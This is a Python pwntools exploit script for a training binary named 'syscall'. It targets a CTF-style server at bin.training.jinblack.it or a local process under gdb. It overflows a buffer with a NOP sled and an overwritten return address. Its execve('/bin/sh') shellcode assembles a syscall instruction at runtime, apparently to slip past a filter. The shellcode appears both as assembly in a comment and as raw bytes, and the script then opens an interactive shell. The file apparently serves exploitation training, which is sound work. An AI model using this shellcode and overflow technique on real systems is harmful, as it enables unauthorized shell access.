# coding=UTF-8
from pwn import *

'''
mov rax, rsp
add rsp, 0x40
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rbx, rbx
push rbx
mov rsi, rsp
mov rdx, rsp
mov rsp, rax
mov rax, 0x3b
mov rcx, 0x0500
add rcx, 0x0f
push rcx
jmp rsp
'''



ELF('./syscall')
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 3101)
else:
    r = process('./syscall')
    gdb.attach(r, '''
        b *0x401270
        c
    ''')

shellcode = b"\x48\x89\xE0\x48\x83\xC4\x40\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\x89\xC4\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC1\x00\x05\x00\x00\x48\x83\xC1\x0F\x51\xFF\xE4"

where_to_jump = p64(0x04041ac)
expl = b"\x90"*216+where_to_jump+b"\x90"*(1000-216-len(where_to_jump)-len(shellcode))+shellcode

input('press a key...')
r.sendline(expl)
r.interactive()
